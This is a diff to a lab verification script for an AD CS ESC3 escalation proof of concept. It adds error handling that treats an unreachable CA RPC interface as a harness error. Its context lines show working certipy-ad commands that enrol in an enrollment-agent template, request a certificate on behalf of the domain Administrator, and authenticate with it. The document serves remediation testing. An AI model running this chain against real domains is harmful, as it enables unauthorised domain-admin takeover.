@@ -26,6 +26,32 @@ AGENT=$(timeout 60 /usr/bin/certipy-ad req \
     -template 'ESC3-Agent' 2>&1 || true)
 echo "--- agent enrol ---"; echo "$AGENT"
 
+# --- CA not serving RPC: HARNESS ERROR, never a verdict ---
+#
+# ept_s_not_registered means the endpoint mapper has no ICertRequestD
+# (91AE6020-9E3C-11CF-8D7C-00AA00C091BE) to hand out: the CA's enrollment
+# interface is not reachable from here, which says nothing about whether the
+# ESC3 template pair is still chainable.
+#
+# This used to fall through to exit 1, which is wrong in BOTH directions.
+# Observed on the 2026-07-26 gate run: gates 1 AND 2 both hit this, so the
+# vulnerable baseline "failed for the right reason" and the remediated host
+# "was still vulnerable" -- on identical output that only ever meant the CA
+# was unreachable. Exit 2 keeps it out of the evidence pool entirely.
+#
+# Both enrollment steps need this guard, so it is a function: an unreachable
+# CA at the on-behalf-of step is exactly as much of a non-verdict as one at
+# the agent step.
+rpc_unreachable() {
+    echo "$1" | grep -qiE 'ept_s_not_registered|Failed to get DCE RPC connection|Failed to get dynamic TCP endpoint'
+}
+
+if rpc_unreachable "$AGENT"; then
+    echo "[verify-poc-09] HARNESS ERROR: CA RPC enrollment interface not registered (agent enrol)" >&2
+    echo "[verify-poc-09] the CA is not serving ICertRequestD to this host -- fix the lab, not the scenario" >&2
+    exit 2
+fi
+
 if [ ! -f alice.pfx ]; then
     if echo "$AGENT" | grep -qiE 'template.*not found|access_denied|enrollment.*denied|cannot enroll'; then
         echo "[verify-poc-09] alice cannot enrol in ESC3-Agent -- BLOCKED"
@@ -45,6 +71,12 @@ ONBEHALF=$(timeout 60 /usr/bin/certipy-ad req \
     -on-behalf-of 'CORP\Administrator' \
     -pfx alice.pfx 2>&1 || true)
 echo "--- on-behalf-of req ---"; echo "$ONBEHALF"
+
+if rpc_unreachable "$ONBEHALF"; then
+    echo "[verify-poc-09] HARNESS ERROR: CA RPC enrollment interface not registered (on-behalf-of)" >&2
+    echo "[verify-poc-09] the CA is not serving ICertRequestD to this host -- fix the lab, not the scenario" >&2
+    exit 2
+fi
 
 if [ -f administrator.pfx ]; then
     AUTH=$(timeout 60 /usr/bin/certipy-ad auth -pfx administrator.pfx -dc-ip 10.20.30.5 2>&1 || true)
